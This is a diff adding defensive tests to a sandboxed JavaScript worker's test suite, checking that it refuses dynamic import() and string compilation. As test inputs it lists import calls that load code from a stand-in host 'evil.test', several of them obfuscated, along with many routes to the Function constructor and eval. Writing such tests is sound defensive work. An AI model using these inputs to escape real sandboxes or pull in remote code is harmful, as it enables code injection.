@@ -161,6 +161,80 @@ describe("LiveJS worker protocol (real WORKER_SOURCE in a vm realm)", () => {
   });
 });
 
+/* ─── No import(), no string compilation (open item 11) ───────────────── */
+
+describe("LiveJS worker: no import() and no way to compile one", () => {
+  const refusedImport = async (source: string) => {
+    const { logs, done } = await runRaw(new VmWorker(), source);
+    expect(logs, source).toHaveLength(1);
+    expect(logs[0][0]).toBe("error");
+    expect(logs[0][1]).toContain('contains the word "import"');
+    expect(done.type).toBe("done");
+  };
+
+  it("refuses any source that contains the word import, before compiling it", async () => {
+    for (const source of [
+      'await import("https://evil.test/m.js")',
+      'await import /* c */ ("https://evil.test/m.js")',
+      'await import ("https://evil.test/m.js")',
+      'await import ("https://evil.test/m.js")',
+      'const x = [...import("https://evil.test/m.js").then(() => [])]',
+      'console.log("import")',
+      "// import\nconsole.log(1)",
+      'console.log({ import: 1 })',
+    ]) {
+      await refusedImport(source);
+    }
+  });
+
+  it("does not refuse longer names that only contain import", async () => {
+    const { logs } = await runRaw(new VmWorker(), "const importer = 1, reimport = 2, import_ = 3, $import = 4; console.log(importer + reimport + import_ + $import);");
+    expect(logs).toEqual([["log", "10"]]);
+  });
+
+  it("removes eval, every Function constructor and string timers", async () => {
+    const tries = {
+      eval: 'eval("1")',
+      indirectEval: '(0, eval)("1")',
+      selfEval: 'self.eval("1")',
+      Function: 'Function("return 1")()',
+      newFunction: 'new Function("return 1")()',
+      ctor: '(function () {}).constructor("return 1")()',
+      protoCtor: 'Function.prototype.constructor("return 1")()',
+      asyncCtor: '(async function () {}).constructor("return 1")()',
+      arrowCtor: '(async () => {}).constructor("return 1")()',
+      genCtor: '(function* () {}).constructor("return 1")().next()',
+      asyncGenCtor: '(async function* () {}).constructor("return 1")().next()',
+      reflect: 'Reflect.construct(Object.getPrototypeOf(() => {}).constructor, ["return 1"])()',
+      timeoutString: 'setTimeout("1")',
+    };
+    const source = [
+      "const out = [];",
+      ...Object.entries(tries).map(
+        ([k, expr]) => `try { await (async () => ${expr})(); out.push(${JSON.stringify(k)} + ":ran"); } catch (e) { out.push(${JSON.stringify(k)} + ":" + (e && e.message)); }`,
+      ),
+      'console.log(out.join("|"));',
+    ].join("\n");
+    const { logs } = await runRaw(new VmWorker(), source);
+    const outcome = Object.fromEntries(logs[0][1].split("|").map((s) => s.split(/:(.*)/s).slice(0, 2)));
+    expect(Object.keys(outcome).sort()).toEqual(Object.keys(tries).sort());
+    for (const [k, v] of Object.entries(outcome)) expect(v, k).toContain("does not compile strings");
+  });
+
+  it("keeps the rest working: function timers, instanceof Function, call/apply, plain .setTimeout props", async () => {
+    const { logs } = await runRaw(
+      new VmWorker(),
+      [
+        "await new Promise((r) => setTimeout(r, 1));",
+        "const f = function () { return this.v; };",
+        "const o = {}; o.setTimeout = 5; o.eval = 6;",
+        "console.log(f instanceof Function, f.call({ v: 7 }), o.setTimeout + o.eval);",
+      ].join("\n"),
+    );
+    expect(logs).toEqual([["log", "true 7 11"]]);
+  });
+});
+
 /* ─── Scope persistence ───────────────────────────────────────────────── */
 
 describe("LiveJS shared scope persistence", () => {
